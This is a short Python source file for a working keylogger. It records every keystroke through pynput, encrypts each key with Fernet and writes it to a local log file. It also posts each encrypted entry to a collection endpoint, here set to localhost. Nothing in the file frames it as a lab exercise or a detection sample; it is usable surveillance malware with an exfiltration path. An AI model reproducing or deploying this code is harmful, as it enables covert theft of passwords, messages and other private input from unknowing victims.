from pynput.keyboard import Listener
from datetime import datetime
from cryptography.fernet import Fernet
import requests, base64

# --- Load encryption key ---
def load_key():
    with open("secret.key", "rb") as key_file:
        return key_file.read()

key = load_key()
fernet = Fernet(key)

# --- Send encrypted data to server ---
def send_to_server(encrypted_data):
    try:
        payload = {"data": base64.b64encode(encrypted_data).decode()}
        requests.post("http://127.0.0.1:5000/receive", json=payload)
    except Exception as e:
        print("Failed to send:", e)

# --- Handle keystrokes ---
def writetofile(key):
    keydata = str(key).replace("'", "")
    if keydata == "Key.space":
        keydata = " "
    elif keydata == "Key.shift":
        keydata = ""
    elif keydata == "Key.enter":
        keydata = "\n"
    elif keydata.startswith("Key."):
        return  # ignore special keys

    if keydata:  # only log if not empty
        encrypted_data = fernet.encrypt(keydata.encode())

        # Save locally
        with open("log.txt", "ab") as f:
            f.write(encrypted_data + b"\n")

        # Send to server
        send_to_server(encrypted_data)

# --- Session Start ---
with open("log.txt", "ab") as f:
    start_msg = f"--- Session started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ---"
    encrypted_start = fernet.encrypt(start_msg.encode())
    f.write(encrypted_start + b"\n")
    send_to_server(encrypted_start)

try:
    with Listener(on_press=writetofile) as l:
        l.join()
except KeyboardInterrupt:
    pass
finally:
    with open("log.txt", "ab") as f:
        end_msg = f"--- Session ended: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ---"
        encrypted_end = fernet.encrypt(end_msg.encode())
        f.write(encrypted_end + b"\n")
        send_to_server(encrypted_end)
